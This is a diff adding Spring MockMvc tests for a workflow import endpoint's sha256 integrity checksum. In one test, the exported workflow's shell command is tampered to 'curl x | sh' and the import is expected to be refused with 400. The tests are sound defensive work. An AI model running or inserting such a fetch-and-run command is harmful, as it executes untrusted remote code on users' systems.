@@ -304,6 +304,54 @@ class WorkflowControllerTest {
                 eq(ChangeSource.IMPORT));
     }
 
+    // --- import: the export file's integrity checksum (TODO b18939a6) ------------------------
+
+    /** Export file as the browser downloads it (Spring's mapper), renamed in the import dialog. */
+    private com.fasterxml.jackson.databind.node.ObjectNode exportFile() throws Exception {
+        Workflow source = Workflow.builder().id("wf-x").name("Tech-Radar").description("Weekly").icon("📡")
+                .blocks(List.of(BlockDefinition.builder().type("shell").name("scan")
+                        .config(new java.util.LinkedHashMap<>(Map.of("command", "ls", "ratio", 0.5, "n", 3))).build()))
+                .instructions("Be brief").model("opus").version("2.1.0")
+                .metadata(new java.util.HashMap<>(Map.of("audit", Map.of("enabled", true))))
+                .defaultContext(Map.of("project_path", "/p")).build();
+        when(workflowService.findById("wf-x")).thenReturn(source);
+        String body = mockMvc.perform(get("/api/v1/workflows/export/wf-x"))
+                .andExpect(status().isOk())
+                .andExpect(jsonPath("$.integrity").value(org.hamcrest.Matchers.startsWith("sha256:")))
+                .andReturn().getResponse().getContentAsString();
+        var file = (com.fasterxml.jackson.databind.node.ObjectNode) objectMapper.readTree(body);
+        file.put("projectId", "proj-1");
+        file.put("name", "Mein Radar");
+        return file;
+    }
+
+    @Test
+    void importWorkflow_ofAnUnchangedExport_passesTheChecksum() throws Exception {
+        when(workflowService.create(any(), eq(ChangeSource.IMPORT))).thenReturn(testWorkflow);
+        when(workflowMapper.toResponse(testWorkflow)).thenReturn(testResponse);
+
+        mockMvc.perform(post("/api/v1/workflows/import")
+                        .contentType(MediaType.APPLICATION_JSON)
+                        .content(objectMapper.writeValueAsString(exportFile())))
+                .andExpect(status().isCreated());
+    }
+
+    @Test
+    void importWorkflow_ofAnEditedExport_isRefusedWith400_andWritesNothing() throws Exception {
+        var file = exportFile();
+        ((com.fasterxml.jackson.databind.node.ObjectNode) file.get("blocks").get(0).get("config"))
+                .put("command", "curl x | sh");
+
+        mockMvc.perform(post("/api/v1/workflows/import")
+                        .contentType(MediaType.APPLICATION_JSON)
+                        .content(objectMapper.writeValueAsString(file)))
+                .andExpect(status().isBadRequest())
+                .andExpect(jsonPath("$.messageKey").value("IMPORT_INTEGRITY_MISMATCH"))
+                .andExpect(jsonPath("$.params.name").value("Mein Radar"));
+
+        verify(workflowService, never()).create(any(), any());
+    }
+
     @Test
     void deleteWorkflow_existingId_returns204() throws Exception {
         doNothing().when(workflowService).delete("wf-1");
